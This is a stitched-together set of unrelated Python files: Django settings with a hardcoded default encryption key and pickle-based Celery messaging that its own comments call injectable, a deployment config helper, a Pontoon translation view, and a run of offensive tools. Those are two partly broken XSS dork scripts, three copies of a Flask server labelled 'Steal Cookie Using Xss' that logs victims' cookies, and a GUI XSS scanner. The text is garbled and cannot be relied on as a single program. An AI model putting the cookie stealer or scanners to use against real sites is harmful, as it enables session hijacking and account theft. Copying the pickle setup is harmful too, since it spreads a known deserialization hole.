FIELD_ENCRYPTION_KEY = os.environ.get('FIELD_ENCRYPTION_KEY', b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=')

if not DEBUG and FIELD_ENCRYPTION_KEY == b'JjvHNnFMfEaGd7Y0SAHBRNZYGGpNs7ydEp-ixmKSvkQ=':
    raise ValueError('FIELD_ENCRYPTION_KEY has to be configured on the OS level, and needs to be different than the '
                     'default key provided. Please create a new key. Instructions are listed here:'
                     'https://github.com/pyca/cryptography. In short, run: key = Fernet.generate_key()')

LOGGING = {
    'version': 1,
    'disable_existing_loggers': False,
    'handlers': {
        'console': {
            'class': 'logging.StreamHandler',  # sys.stdout
            'formatter': 'color',
        },
    },
    'formatters': {
        'debug': {
            'format': '%(asctime)s\t%(levelname)-8s - %(filename)-20s:%(lineno)-4s - '
                      '%(funcName)20s() - %(message)s',
        },
        'color': {
            '()': 'colorlog.ColoredFormatter',
            'format': '%(log_color)s%(asctime)s\t%(levelname)-8s - '
                      '%(message)s',
            'datefmt': '%Y-%m-%d %H:%M',
            'log_colors': {
                'DEBUG': 'green',
                'INFO': 'white',
                'WARNING': 'yellow',
                'ERROR': 'red',
                'CRITICAL': 'bold_red',
            },
        }
    },
    'loggers': {
        # Used when there is no log defined or loaded. Disabled given we always use __package__ to log.
        # Would you enable it, all logging messages will be logged twice.
        # '': {
        #     'handlers': ['console'],
        #     'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        # },

        # Default Django logging, we expect django to work, and therefore only show INFO messages.
        # It can be smart to sometimes want to see what's going on here, but not all the time.
        # https://docs.djangoproject.com/en/2.1/topics/logging/#django-s-logging-extensions
        'django': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'INFO'),
        },

        # We expect to be able to debug websecmap all of the time.
        'dashboard': {
            'handlers': ['console'],
            'level': os.getenv('DJANGO_LOG_LEVEL', 'DEBUG'),
        },
    },
}


# settings to get WebSecMap to work:
# Celery 4.0 settings
# Pickle can work, but you need to use certificates to communicate (to verify the right origin)
# It's preferable not to use pickle, yet it's overly convenient as the normal serializer can not
# even serialize dicts.
# http://docs.celeryproject.org/en/latest/userguide/configuration.html
CELERY_accept_content = ['pickle', 'yaml']
CELERY_task_serializer = 'pickle'
CELERY_result_serializer = 'pickle'


# Celery config
CELERY_BROKER_URL = os.environ.get('BROKER', 'redis://localhost:6379/0')
ENABLE_UTC = True

# Any data transfered with pickle needs to be over tls... you can inject arbitrary objects with
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# this stuff... message signing makes it a bit better, not perfect as it peels the onion.
# see: https://blog.nelhage.com/2011/03/exploiting-pickle/
# Yet pickle is the only convenient way of transporting objects without having to lean in all kinds
# of directions to get the job done. Intermediate tables to store results could be an option.
CELERY_ACCEPT_CONTENT = ['pickle']
CELERY_TASK_SERIALIZER = 'pickle'
CELERY_RESULT_SERIALIZER = 'pickle'
CELERY_TIMEZONE = 'UTC'

CELERY_BEAT_SCHEDULER = 'django_celery_beat.schedulers:DatabaseScheduler'

CELERY_BROKER_CONNECTION_MAX_RETRIES = 1
CELERY_BROKER_CONNECTION_RETRY = False
CELERY_RESULT_EXPIRES = timedelta(hours=4)

# Use the value of 2 for celery prefetch multiplier. Previous was 1. The
# assumption is that 1 will block a worker thread until the current (rate
# limited) task is completed. When using 2 (or higher) the assumption is that
# celery will drop further rate limited task from the internal worker queue and
# fetch other tasks tasks that could be executed (spooling other rate limited
# tasks through in the process but to no hard except for a slight drop in
# overall throughput/performance). A to high value for the prefetch multiplier
# might result in high priority tasks not being picked up as Celery does not
# seem to do prioritisation in worker queues but only on the broker
# queues. The value of 2 is currently selected because it higher than 1,
# behaviour needs to be observed to decide if raising this results in
# further improvements without impacting the priority feature.
CELERY_WORKER_PREFETCH_MULTIPLIER = 2

# numer of tasks to be executed in parallel by celery
CELERY_WORKER_CONCURRENCY = 10

# Workers will scale up and scale down depending on the number of tasks
# available. To prevent workers from scaling down while still doing work,
# the ACKS_LATE setting is used. This insures that a task is removed from
# the task queue after the task is performed. This might result in some
# issues where tasks that don't finish or crash keep being executed:
# thus for tasks that are not programmed perfectly it will raise a number
# of repeated exceptions which will need to be debugged.
CELERY_ACKS_LATE = True

TOOLS = {
    'organizations': {
        'import_data_dir': '',
    },
}

OUTPUT_DIR = os.environ.get('OUTPUT_DIR', os.path.abspath(os.path.dirname(__file__)) + '/')
VENDOR_DIR = os.environ.get('VENDOR_DIR', os.path.abspath(os.path.dirname(__file__) + '/../vendor/') + '/')

if DEBUG:
    # too many sql variables....
    DATA_UPLOAD_MAX_NUMBER_FIELDS = 10000


# Compression
# Django-compressor is used to compress css and js files in production
# During development this is disabled as it does not provide any feature there
# Django-compressor configuration defaults take care of this.
# https://django-compressor.readthedocs.io/en/latest/usage/
# which plugins to use to find static files
STATICFILES_FINDERS = (
    # default static files finders
    'django.contrib.staticfiles.finders.FileSystemFinder',
    'django.contrib.staticfiles.finders.AppDirectoriesFinder',
    # other finders..
    'compressor.finders.CompressorFinder',
)

COMPRESS_CSS_FILTERS = ['compressor.filters.cssmin.CSSCompressorFilter']

# Slimit doesn't work with vue. Tried two versions. Had to rewrite some other stuff.
# Now using the default, so not explicitly adding that to the settings
# COMPRESS_JS_FILTERS = ['compressor.filters.jsmin.JSMinFilter']

# Brotli compress storage gives some issues.
# This creates the original compressed and a gzipped compressed file.
COMPRESS_STORAGE = (
    'compressor.storage.GzipCompressorFileStorage'
)

# Enable static file (js/css) compression when not running debug
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_OFFLINE
COMPRESS_OFFLINE = not DEBUG
# https://django-compressor.readthedocs.io/en/latest/settings/#django.conf.settings.COMPRESS_ENABLED
# Enabled when debug is off by default.


import os
import argparse
from jinja2 import Environment, FileSystemLoader


def make_eb_config(application_name, default_region):
    # Capture our current directory
    UTILS_DIR = os.path.dirname(os.path.abspath(__file__))
    # Create the jinja2 environment.
    # Notice the use of trim_blocks, which greatly helps control whitespace.
    j2_env = Environment(loader=FileSystemLoader(UTILS_DIR))                    
    return j2_env.get_template('templates/eb/config.yml').render(
        APPLICATION_NAME=application_name,
        DEFAULT_REGION=default_region
    )


def write_eb_config(dest, application_name, default_region):
    contents = make_eb_config(application_name, default_region)
    fh = open(dest, 'w')
    fh.write(contents)
    fh.close()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='EB Config Maker')
    # Optional argument
    parser.add_argument('--dest', type=str,
                        help='The destination of the generated eb config',
                        default='./.elasticbeanstalk/config.yml')

    parser.add_argument('--name', type=str,
                        required=True,
                        help='The name of the application')

    parser.add_argument('--region', type=str,
                        required=True,
                        help='The default application region')

    args = parser.parse_args()

    write_eb_config(args.dest, application_name=args.name, default_region=args.region)

import urllib3 as url
from pyquery import PyQuery
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input("[Input Dork] >_ "))
        req = url.PoolManager()
        for page in range(4):                    
            send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork + "&page=" + str(page))                    
            parser = BeautifulSoup(send.data, features="lxml")                    
            for link in parser.find_all('cite'):                    
                result = link.string                    
                x = str(input("[Input Script] >_ "))                    
                print(str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")                    

import urllib3 as url
from pyquery import PyQuery                    
from bs4 import BeautifulSoup
import requests

class Xss:
    def main():
        user_dork = str(input("[Input Dork] >_ "))
        req = url.PoolManager()
        send = req.request("GET", "http://www1.search-results.com/web?q=" + user_dork + "&page=" + str(page))                    
        parser = BeautifulSoup(send.data, features="lxml")                    
        for link in parser.find_all('cite'):
            result = link.string
            x = str(input("[Input Script] >_ "))                    
            print(str(result) + "'" + "<marquee style='background:red'>" + x + "</marquee>")                    

from flask import Flask,request
from termcolor import colored
app = Flask(__name__)
@app.route('/')
def index():
	return 'steal cookie :) '                    
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == "GET" or request.method == "POST":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()

from flask import Flask,request
from termcolor import colored
from time import sleep
print ('\n\t[ Steal Cookie Using Xss .. ]\n\n')                    
print(colored('\n\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')                    
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == "GET" or request.method == "POST":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()

from flask import Flask,request                    
from termcolor import colored                    
from time import sleep                    
print ('\n\t[ Steal Cookie Using Xss .. ]\n')
print(colored('\n[*] ','yellow')+'Coded By : Khaled Nassar @knassar702\n\n')
sleep(2)
app = Flask(__name__)
@app.route('/')
def index():
	return 'Hello ^_^'
@app.route('/cookie',methods=['GET','POST'])
def steal():
	if request.method == "GET" or request.method == "POST":
		data = request.values
		cookie = data.get('cookie')
		with open('cookies.txt',mode='a') as f:
			f.write('\n---------------------------\n'+cookie+'\n---------------------------\n')
		print(colored('\n\n[+] ','green')+'New Cookie ..\n\n')
		return 'Thanks :)'
if __name__ == '__main__':
	app.run()

import sys,threading,time
from datetime import datetime
try:
 from tkinter import *
 from tkinter import ttk
except:
 print("You need to install: tkinter")
 sys.exit()
try:
 import bane
except:
 print("You need to install: bane")
 sys.exit()

class sc(threading.Thread):
 def run(self):
  global stop
  ti=time.time()
  print("="*25)
  print("\n[*]Target: {}\n[*]Date: {}".format(target.get(),datetime.now().strftime("%d/%m/%Y %H:%M:%S")))
  crl=[target.get()]
  if crawl.get()=='On':
   crl+=bane.crawl(target.get(),bypass=True)
  pr=proxy.get()
  if len(pr)==0:
   pr=None
  if method.get()=="GET":
   get=True
   post=False
  elif method.get()=="POST":
   get=False
   post=True
  else:
   get=True
   post=True
  fresh=False
  if refresh.get()=="On":
   fresh=True
  ck=None
  c=cookie.get()
  if len(c)>0:
   ck=c
  for x in crl:
   if stop==True:
    break
   print("[*]URL: {}".format(x))
   bane.xss(x,payload=payload.get(),proxy=pr,get=get,post=post,user_agent=user_agent.get(),fresh=fresh,cookie=ck)
  print("[*]Test was finished at: {}\n[*]Duration: {} seconds\n".format(datetime.now().strftime("%d/%m/%Y %H:%M:%S"),int(time.time()-ti)))
  print("="*25)

stop=False

def scan():
 sc().start()

class ki(threading.Thread):
 def run(self):
  global stop
  stop=True

def kill():
 ki().start()

main = Tk()
main.title("XSS Sonar")
main.configure(background='light sky blue')
Label(main, text = "Target:",background='light sky blue').grid(row=0)
Label(main, text = "Cookie: (Optional)",background='light sky blue').grid(row=1)
Label(main, text = "Method:",background='light sky blue').grid(row=2)
Label(main, text = "Timeout:",background='light sky blue').grid(row=3)
Label(main, text = "User-Agent:",background='light sky blue').grid(row=4)
Label(main, text = "Payload:",background='light sky blue').grid(row=5)
Label(main, text = "HTTP Proxy:",background='light sky blue').grid(row=6)
Label(main, text = "Refresh:",background='light sky blue').grid(row=7)
Label(main, text = "Crawl",background='light sky blue').grid(row=8)
Label(main, text = "",background='light sky blue').grid(row=9)
Label(main, text = "",background='light sky blue').grid(row=10)

ua=[""]
ua+=bane.ua
li=bane.read_file('xss.txt')
pl=[]                    
for x in li:
 pl.append(x.strip())
prox=[""]
prox+=bane.http(200)
global target
target = Entry(main)
target.insert(0,'http://')
global cookie
cookie=Entry(main)
global method
method= ttk.Combobox(main, values=["GET & POST", "GET", "POST"])
global timeout
timeout=ttk.Combobox(main, values=range(1,61))
timeout.current(14)
global user_agent
user_agent=ttk.Combobox(main, values=ua)
user_agent.current(1)
global payload
payload = ttk.Combobox(main, values=pl)
payload.current(0)
global proxy
proxy=ttk.Combobox(main, values=prox)
global refresh
refresh=ttk.Combobox(main, values=["On", "Off"])
global crawl
crawl=ttk.Combobox(main, values=["On", "Off"])

target.grid(row=0, column=1)
target.config(width=30)
cookie.grid(row=1, column=1)
cookie.config(width=30)
method.grid(row=2, column=1)
method.current(0)
method.config(width=30)
timeout.grid(row=3, column=1)
timeout.config(width=30)
user_agent.grid(row=4, column=1)
user_agent.config(width=30)
payload.grid(row=5, column=1)
payload.config(width=30)
proxy.grid(row=6, column=1)
proxy.current(0)
proxy.config(width=30)
refresh.grid(row=7, column=1)
refresh.current(1)
refresh.config(width=30)
crawl.grid(row=8, column=1)
crawl.current(0)
crawl.config(width=30)

Button(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4)
Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4)
Button(main, text='Scan', command=scan).grid(row=11, column=4, sticky=W, pady=4)
Label(main, text = "\n\nCoder: Ala Bouali\nGithub: https://github.com/AlaBouali\nE-mail: trap.leader.123@gmail.com\n\nDisclaimer:\nThis tool is for educational purposes only!!!\n\n\n", background='light sky blue').grid(row=12,column=1)
mainloop()


import logging

from bulk_update.helper import bulk_update

from django.contrib.auth.decorators import login_required
from django.db import transaction
from django.http import (
    HttpResponseBadRequest,
    HttpResponseForbidden,
    JsonResponse,
)
from django.shortcuts import get_object_or_404
from django.views.decorators.http import (
    require_POST
)

from pontoon.base.models import (
    ChangedEntityLocale,
    Entity,
    Locale,
    Project,
    ProjectLocale,
    TranslationMemoryEntry,
    Translation,
)
from pontoon.base.utils import (
    require_AJAX,
    readonly_exists,
)
from pontoon.batch import forms
from pontoon.batch.actions import ACTIONS_FN_MAP


log = logging.getLogger(__name__)


def update_stats(translated_resources, locale):
    """Update stats on a list of TranslatedResource.
    """
    projects = set()
    for translated_resource in translated_resources:
        projects.add(translated_resource.resource.project)
        translated_resource.calculate_stats(save=False)

    bulk_update(translated_resources, update_fields=[
        'total_strings',
        'approved_strings',
        'fuzzy_strings',
        'strings_with_errors',
        'strings_with_warnings',
        'unreviewed_strings',
    ])

    locale.aggregate_stats()

    for project in projects:
        project.aggregate_stats()
        ProjectLocale.objects.get(locale=locale, project=project).aggregate_stats()


def mark_changed_translation(changed_entities, locale):
    """Mark entities as changed, for later sync.
    """
    changed_entities_array = []
    existing = (
        ChangedEntityLocale.objects
        .values_list('entity', 'locale')
        .distinct()
    )
    for changed_entity in changed_entities:
        key = (changed_entity.pk, locale.pk)

        # Remove duplicate changes to prevent unique constraint violation.
        if key not in existing:
            changed_entities_array.append(
                ChangedEntityLocale(entity=changed_entity, locale=locale)
            )

    ChangedEntityLocale.objects.bulk_create(changed_entities_array)


def update_translation_memory(changed_translation_pks, project, locale):
    """Update translation memory for a list of translations.
    """
    memory_entries = [
        TranslationMemoryEntry(
            source=t.entity.string,
            target=t.string,
            locale=locale,
            entity=t.entity,
            translation=t,
            project=project,
        ) for t in (
            Translation.objects
            .filter(pk__in=changed_translation_pks)
            .prefetch_related('entity__resource')
        )
    ]
    TranslationMemoryEntry.objects.bulk_create(memory_entries)


@login_required(redirect_field_name='', login_url='/403')
@require_POST
@require_AJAX
@transaction.atomic
def batch_edit_translations(request):
    """Perform an action on a list of translations.

    Available actions are defined in `ACTIONS_FN_MAP`. Arguments to this view
    are defined in `models.BatchActionsForm`.

    """
    form = forms.BatchActionsForm(request.POST)
    if not form.is_valid():
        return HttpResponseBadRequest(form.errors.as_json())                    

    locale = get_object_or_404(Locale, code=form.cleaned_data['locale'])
    entities = Entity.objects.filter(pk__in=form.cleaned_data['entities'])

    if not entities.exists():
        return JsonResponse({'count': 0})

    # Batch editing is only available to translators. Check if user has
    # translate permissions for all of the projects in passed entities.
    # Also make sure projects are not enabled in read-only mode for a locale.
    projects_pk = entities.values_list('resource__project__pk', flat=True)
    projects = Project.objects.filter(pk__in=projects_pk.distinct())

    for project in projects:
        if (
            not request.user.can_translate(project=project, locale=locale)
            or readonly_exists(projects, locale)
        ):
            return HttpResponseForbidden(
                "Forbidden: You don't have permission for batch editing"
            )

    # Find all impacted active translations, including plural forms.
    active_translations = Translation.objects.filter(
        active=True,
        locale=locale,
        entity__in=entities,
    )

    # Execute the actual action.
    action_function = ACTIONS_FN_MAP[form.cleaned_data['action']]
    action_status = action_function(
        form,
        request.user,
        active_translations,
        locale,
    )

    if action_status.get('error'):
        return JsonResponse(action_status)

    invalid_translation_count = len(action_status.get('invalid_translation_pks', []))
    if action_status['count'] == 0:
        return JsonResponse({
            'count': 0,
            'invalid_translation_count': invalid_translation_count,
        })

    update_stats(action_status['translated_resources'], locale)
    mark_changed_translation(action_status['changed_entities'], locale)

    # Update latest translation.
    if action_status['latest_translation_pk']:
        Translation.objects.get(
            pk=action_status['latest_translation_pk']
        ).update_latest_translation()

    update_translation_memory(
        action_status['changed_translation_pks'],
        project,
        locale
    )

    return JsonResponse({
        'count': action_status['count'],
        'invalid_translation_count': invalid_translation_count,
    })

